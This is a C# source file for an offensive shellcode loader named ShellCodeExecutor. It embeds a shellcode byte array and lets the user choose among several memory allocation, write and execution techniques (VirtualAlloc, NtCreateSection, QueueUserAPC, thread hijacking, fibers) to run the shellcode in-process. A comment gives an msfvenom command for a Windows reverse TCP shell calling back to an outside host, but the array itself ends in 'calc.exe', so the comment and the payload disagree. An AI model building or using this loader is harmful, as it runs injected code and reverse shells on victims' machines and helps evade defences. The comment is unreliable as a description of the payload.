using System;
using static ShellCodeExecutor.MemoryAllocator;
using static ShellCodeExecutor.MemoryWriter;
namespace ShellCodeExecutor
{

    public class Program {

        //└─# msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.56.105 LPORT=80 -f csharp -v shellCode
        static byte[] shellCode = new byte[276] {
            0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
            0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
            0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
            0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
            0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
            0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
            0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,
            0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,
            0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,
            0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
            0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,
            0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
            0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,
            0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
            0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,
            0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
            0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,
            0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,
            0x63,0x2e,0x65,0x78,0x65,0x00 };





        static void Main(string[] args){
            //Set Defaults (VirtualAlloc for Alloc, WriteProcessMemory for Write and Classic Shellcode Runner for execution)
            ALLOCATE_TYPES allocType = ALLOCATE_TYPES.VirtualAlloc;
            WRITE_METHOD writeMethod = WRITE_METHOD.WriteProcessMemory;
            IShellCodeRunner shellCodeRunner = new ClassicShellCodeRunner();

            for (int i = 0; i < args.Length; i++){
                switch (args[i]) {
                    case "-a":
                        if (i + 1 == args.Length)
                        {
                            Console.WriteLine("[-] Missing ShellCode Execution Type \n Exiting");
                        }

                        if (!Enum.TryParse(args[i+1], out allocType))
                        {
                            Console.WriteLine("[-] Unknown allocation type '"+args[i+1]+"' \n Exiting");
                            return;
                        }
                        i++;
                        break;
                    case "-s":
                        if (i+1 == args.Length)
                        {
                            Console.WriteLine("[-] Missing ShellCode Execution Type \n Exiting");
                        }
                        switch (args[i + 1]){
                            case "Classic":
                                shellCodeRunner = new ClassicShellCodeRunner();
                                break;
                            case "Delegate":
                                shellCodeRunner = new DelegateShellCodeRunner();
                                break;
                            case "LocalThreadHighjack":
                                shellCodeRunner = new LocalThreadHighjackingShellCodeRunner();
                                break;
                            case "QueueUserAPC":
                                shellCodeRunner = new QueueUserAPCShellCodeRunner();
                                break;
                            case "Fiber":
                                shellCodeRunner = new FiberShellCodeRunner();
                                break;
                            default:
                                Console.WriteLine("[-] Unknown execution type '" + args[i + 1] + "' \n Exiting");
                                return;
                             
                        }
                        i++;
                        
                        break;
                    case "-w":
                        if (i + 1 == args.Length)
                        {
                            Console.WriteLine("[-] Missing Write Method Type \n Exiting");
                        }
                        if (!Enum.TryParse(args[i + 1], out writeMethod))
                        {
                            Console.WriteLine("[-] Unknown WriteMethod type '" + args[i + 1] + "' \n Exiting");
                            return;
                        }
                        i++;
                        break;
                    case "-h":
                        printHelp();
                        return;
                    default:
                        Console.WriteLine("[-] Unknown argument '" + args[i] + "' \n Exiting");
                        return;
                }
            }
            Console.WriteLine("[+] Using selected Allocation " + allocType + ", Write Method " + writeMethod + ", Shellcode Execution " + shellCodeRunner.ToString());
            Console.WriteLine("[+] Allocating Memory");
            IntPtr rwxMemory = MemoryAllocator.AllocateMemory((uint)shellCode.Length, allocType);
            Console.WriteLine("[+] Writing Shellcode to Memory");
            MemoryWriter.WriteToMemory(rwxMemory, shellCode, writeMethod);
            Console.WriteLine("[+] Executing Memory");
            shellCodeRunner.RunShellCode(rwxMemory);

        }
        static void printHelp(){
            Console.WriteLine("ShellCodeExecutor.exe: Executes shellcode stored in shellCode variable within the same process, allows specifying the memory allocation, shellcode writing method and shellcode execution method");
            Console.WriteLine("Arguments");
            Console.WriteLine("\t -a <Allocation_Method>: Specifies which allocation method to use. Available choices:  VirtualAlloc (Default), VirtualAllocEx, VirtualAllocExNuma, NtCreateSection");
            Console.WriteLine("\t -h : Show help menu.");
            Console.WriteLine("\t -s <ShellCode_Execution_Method>: Specifies which shellcode execution method to use. Available choices:  Classic (Default), Delegate, LocalThreadHighjack, QueueUserAPC, Fiber");
            Console.WriteLine("\t -w <Write_Method>: Specifies which write method to use when writing shellcode to memory. Available choices:  WriteProcessMemory (Default), MarshalCopy, RtlMoveMemory");

        }

    }
}
